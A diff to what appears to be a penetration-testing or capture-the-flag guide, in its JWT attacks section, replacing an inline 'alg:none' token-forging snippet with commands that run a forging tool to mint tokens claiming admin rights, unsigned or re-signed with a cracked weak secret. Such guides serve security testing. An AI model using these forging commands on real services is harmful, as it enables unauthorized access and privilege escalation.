@@ -87,11 +87,10 @@ See `references/jwt-attacks.md` for common techniques and
 echo "<jwt>" | cut -d. -f1 | base64 -d
 echo "<jwt>" | cut -d. -f2 | base64 -d
 
-# Try alg:none attack
-python3 -c "
-import jwt
-print(jwt.encode({'user':'admin'}, key='', algorithm='none'))
-"
+# Forge variants — alg:none, and HS* re-sign once a weak secret is recovered
+# (stdlib-only; session_dissect.py analyses and recovers, jwt_forge.py mints)
+python3 tools/web/jwt_forge.py --token "<jwt>" --claims '{"user":"admin","role":"admin"}'
+python3 tools/web/jwt_forge.py --token "<jwt>" --claims '{"user":"admin"}' --secret secret123
 ```
 
 ## Access Control / Privilege Escalation
